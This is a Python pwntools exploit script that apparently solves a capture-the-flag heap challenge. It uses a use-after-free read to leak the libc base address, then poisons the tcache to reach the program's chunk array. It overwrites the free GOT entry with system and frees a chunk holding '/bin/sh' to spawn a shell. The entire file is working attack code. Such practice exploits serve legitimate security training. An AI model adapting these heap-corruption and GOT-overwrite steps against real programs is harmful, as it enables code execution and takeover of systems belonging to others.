#!/usr/bin/env python3

from pwn import *

exe = ELF("challenge_patched")
libc = ELF("libc.so.6")
ld = ELF("ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = 'debug'
gs = '''
set solib-search-path /home/huhu/my-task/pwn/daily-task/bai12
'''

def start():
    if args.GDB:
        return gdb.debug(exe.path, gdbscript=gs)
    else:
        return process(exe.path)
p = start()
def choice(index):
    p.sendlineafter(b"Please input your choice > \x00", str(index).encode())
def malloc(index, size):
    choice(1)
    p.sendlineafter(b"Please input the chunk index > ", str(index).encode())
    p.sendlineafter(b"Please input the size > ", str(size).encode())
def show(index):
    choice(4)
    p.sendlineafter(b"Please input the chunk index > ", str(index).encode())
def free(index):
    choice(5)
    p.sendlineafter(b"Please input the chunk index > ", str(index).encode())
def edit(index, size, context):
    choice(6)
    p.sendlineafter(b"Please input the chunk index > ", str(index).encode())
    p.sendlineafter(b"Please input the size > ", str(size).encode())
    p.sendafter(b"Please input the content > ", context)

malloc(0, 0x410)
malloc(1, 0x410)
free(0)
show(0)
base = u64(p.recv(6) + b"\x00" + b'\x00') - (libc.symbols['main_arena'] + 0x60)
log.info(f"[*]base: {hex(base)}")
free(1)
malloc(0, 0x80)
malloc(1, 0x80)
free(0)
free(1)
edit(1,8,p64(exe.symbols['chunks']))
malloc(0, 0x80)
malloc(1, 0x80)
edit(1,0x24,p64(0x80) + p64(next(libc.search(b"/bin/sh\x00")) + base) + p64(0x80) + p64(exe.got['free']))
edit(1, 0x8, p64(libc.symbols['system'] + base))
free(0)

p.interactive()
